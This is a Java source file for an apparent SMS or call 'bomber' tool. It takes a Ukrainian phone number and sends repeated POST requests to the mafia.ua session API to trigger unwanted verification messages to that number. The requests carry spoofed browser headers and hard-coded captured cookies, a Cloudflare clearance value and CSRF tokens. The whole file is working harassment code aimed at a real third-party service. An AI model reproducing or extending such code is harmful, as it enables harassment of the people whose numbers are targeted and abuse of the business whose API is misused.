package com.whiteursa.cyberwizard.bomber.impl;

import com.whiteursa.cyberwizard.bomber.IBomber;
import okhttp3.*;
import org.jetbrains.annotations.NotNull;
import org.springframework.stereotype.Component;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

@Component
public class BomberImpl implements IBomber {

    public BomberImpl() {
    }

    @Override
    public void bomb(String number, int quantity) {
        List<Request> requestList = new ArrayList<>();

        OkHttpClient client = new OkHttpClient();

        RequestBody formBody = new FormBody.Builder()
                .build();

        Request request = new Request.Builder()
                .url(String.format("https://mafia.ua/ua/api/sessions/380%s", number))
                .header("Host", "mafia.ua")
                .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0")
                .header("Accept", "*/*")
                .header("Accept-Language", "en-US,en;q=0.5")
                .header("Accept-Encoding", "gzip, deflate, br")
                .header("Referer", "https://mafia.ua/ua/checkout")
                .header("X-NewRelic-ID", "VgAEVVNQDBACXVRWAAkHVg==")
                .header("X-CSRF-TOKEN", "DqMiGERaBtYyXK4wtN7zbmoViVUTG1sB8ccTyTOb")
                .header("X-Requested-With", "XMLHttpRequest")
                .header("Origin", "https://mafia.ua")
                .header("Connection", "keep-alive")
                .header("Cookie", "__cfduid=d04bf3b8c6163aa6bb8e9d71b4f20deb71612884022; cf_chl_prog=a19; cf_clearance=6d55dc423c4988bafa6c841b4fe497a121733c1c-1612884227-0-250; XSRF-TOKEN=eyJpdiI6IlVybTl5NXgrUEEzZ0NnNGFjQXd0c3c9PSIsInZhbHVlIjoieGVvN1ZmMFBxXC95b1pCTTNreVoxRlhsMER2R1FmUGVaaXVXc2JIeVwvenRqQVVmcXB3K1dMWlZ1WmQ5dVRFMklaVW9GcE5HMlJwdkFNWlNCYjA5RFBtdz09IiwibWFjIjoiYzMxZmQ5ZWViYjBiMDJkNzU5MDYxZmFmMDMzNzllNjU2ZmZiOGE2Y2YwOTg1OGI4YmJjMDNkMDg0YWM2ZGNkMSJ9; laravel_session=eyJpdiI6IldxSnFwUVBoTTZoNllGa3lLZDNjeEE9PSIsInZhbHVlIjoicDNrRFA3MnZxbFF2b3N1UEw2UFZiamFFSDZ3TGt5Y25vQStHUU9VKzhvbFpvT3RtU0dMNVpaRlYrWmU0dDI0XC8rNGd6NEoxYUdGUFBFVXJTeG5xbm13PT0iLCJtYWMiOiI5ODkzNTY4NGZiNGVjZmQ2MDIxYTg1YTM0MjVmNjI1OWQ2MWRlZTkwMjE0MDEyODY0MzcwMDkzZGU0ZWUxMDNjIn0%3D; city=eyJpdiI6InEwNTcrQWpSR20yUWhcL0F5RGQ1dEVnPT0iLCJ2YWx1ZSI6IlpUSm1RZjhUcDMxRGxNUFRrM25FQ2c9PSIsIm1hYyI6IjVjZDYyZTRhNDkzOWQxNzE5MTU0NjNlNWE5NWMzYTUxN2RmMGFiYTdmMjgxMDM2OWUxNzAzNmI5YTFmNTIxOTUifQ%3D%3D; id_city=eyJpdiI6IjAxODV6a1pWeVRPcjh6MVhVTEdcLzR3PT0iLCJ2YWx1ZSI6IkxqdGNXUjF1NU0wSSt4M01vblNJU2c9PSIsIm1hYyI6IjNkNzFkNGMwMGIyNmE5NmVkYTI5MDVmYmY1MWY5OTI3YmQzNDI3MDAzMWQyMTU5ZWUyZmZmOGYwNTRjYmM1ZGUifQ%3D%3D; abtest_seed=eyJpdiI6Im9GSVwvWmdkXC9mYVgyWDB6cHo0bng4UT09IiwidmFsdWUiOiJpUzA3RjdYd2lxbzk2bkJrNmVKZUtBPT0iLCJtYWMiOiI0ODYwZWNlYWUzMDY5NTFhN2VjZjM1Mzc1OGQxYjY0YTBhM2FiYTc4ZDMzYWI1YzA1MzI4NTA2ZTgyZmQzM2VkIn0%3D; _ga=GA1.2.1101452438.1612884237; _gid=GA1.2.37240100.1612884237; emarketing_widget_pagecount=3; _fbp=fb.1.1612884240900.1465144543; lapuid=59303955-3771-4c59-91e1-1867978727db; MgidSensorNVis=1; MgidSensorHref=https://mafia.ua/ua/kiev/product/karibskaya-kruglaya-11726")
                .header("Content-Length", "0")
                .header("TE", "Trailers")
                .post(formBody)
                .build();
        requestList.add(request);

        request = new Request.Builder()
                .url(String.format("https://mafia.ua/ua/api/sessions/380%s", number))
                .header("Host", "mafia.ua")
                .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0")
                .header("Accept", "*/*")
                .header("Accept-Language", "en-US,en;q=0.5")
                .header("Accept-Encoding", "gzip, deflate, br")
                .header("Referer", "https://mafia.ua/ua/checkout")
                .header("X-NewRelic-ID", "VgAEVVNQDBACXVRWAAkHVg==")
                .header("X-CSRF-TOKEN", "DqMiGERaBtYyXK4wtN7zbmoViVUTG1sB8ccTyTOb")
                .header("X-Requested-With", "XMLHttpRequest")
                .header("Origin", "https://mafia.ua")
                .header("Connection", "keep-alive")
                .header("Cookie", "__cfduid=d04bf3b8c6163aa6bb8e9d71b4f20deb71612884022; cf_chl_prog=a19; cf_clearance=6d55dc423c4988bafa6c841b4fe497a121733c1c-1612884227-0-250; XSRF-TOKEN=eyJpdiI6ImhRaWozaDJ3RWU2V1hkXC95WkpIem13PT0iLCJ2YWx1ZSI6ImpvazBDcEpOVzBBSFArckNYaE41TFE4QlN6V2ErN3pnTURRNUxjOFdOVmEwWnRtWWVMSHloRmZJbytMWEtJN055czJnSjB2QW1RRElJWnJyaCtrNGF3PT0iLCJtYWMiOiJiYTIyNTEzOWE4N2ViMDUwZTM2YWFiYzhiNzY4MTY2OWYzMmViZTU3OTg3YmYyZDM5MmFhYzFhZDI5NTJlODc0In0%3D; laravel_session=eyJpdiI6IkptZXlnNFNEQ2o4TU5NQjBHVHkyS0E9PSIsInZhbHVlIjoiR282MnVmeXYzcFBocklWMXNBSW1RWmRxbElUZTkrb1wvSVpJcG1XWTVOTmpGWTFUN2ZIa1JxeG4wZGNuVjZ0Qjl2OURyU1REMG1aSVlQZUJGSzRqTXVBPT0iLCJtYWMiOiI1OTVkODhlYzk3NzY0Njc2NDNlMmM5NjE2ZTg1Nzg3ODY4MDRkZTBiYzcwZDU5YThiNjBiYjUyYWY3NzE4MzU4In0%3D; city=eyJpdiI6InEwNTcrQWpSR20yUWhcL0F5RGQ1dEVnPT0iLCJ2YWx1ZSI6IlpUSm1RZjhUcDMxRGxNUFRrM25FQ2c9PSIsIm1hYyI6IjVjZDYyZTRhNDkzOWQxNzE5MTU0NjNlNWE5NWMzYTUxN2RmMGFiYTdmMjgxMDM2OWUxNzAzNmI5YTFmNTIxOTUifQ%3D%3D; id_city=eyJpdiI6IjAxODV6a1pWeVRPcjh6MVhVTEdcLzR3PT0iLCJ2YWx1ZSI6IkxqdGNXUjF1NU0wSSt4M01vblNJU2c9PSIsIm1hYyI6IjNkNzFkNGMwMGIyNmE5NmVkYTI5MDVmYmY1MWY5OTI3YmQzNDI3MDAzMWQyMTU5ZWUyZmZmOGYwNTRjYmM1ZGUifQ%3D%3D; abtest_seed=eyJpdiI6Im9GSVwvWmdkXC9mYVgyWDB6cHo0bng4UT09IiwidmFsdWUiOiJpUzA3RjdYd2lxbzk2bkJrNmVKZUtBPT0iLCJtYWMiOiI0ODYwZWNlYWUzMDY5NTFhN2VjZjM1Mzc1OGQxYjY0YTBhM2FiYTc4ZDMzYWI1YzA1MzI4NTA2ZTgyZmQzM2VkIn0%3D; _ga=GA1.2.1101452438.1612884237; _gid=GA1.2.37240100.1612884237; emarketing_widget_pagecount=6; _fbp=fb.1.1612884240900.1465144543; lapuid=59303955-3771-4c59-91e1-1867978727db; MgidSensorNVis=2; MgidSensorHref=https://mafia.ua/ua/kiev/product/dragon-xxxl-12125")
                .header("Content-Length", "0")
                .header("TE", "Trailers")
                .post(formBody)
                .build();
        requestList.add(request);

        for (Request requestToSend : requestList ) {
            client.newCall(requestToSend).enqueue(new Callback() {
                @Override
                public void onFailure(@NotNull Call call, @NotNull IOException e) {
                    e.printStackTrace();
                }

                @Override
                public void onResponse(@NotNull Call call, @NotNull final Response response) throws IOException {
                    if (!response.isSuccessful()) {
                        throw new IOException("Unexpected code " + response);
                    } else {
                        System.out.println(call.toString());
                    }
                }
            });
        }
    }
}
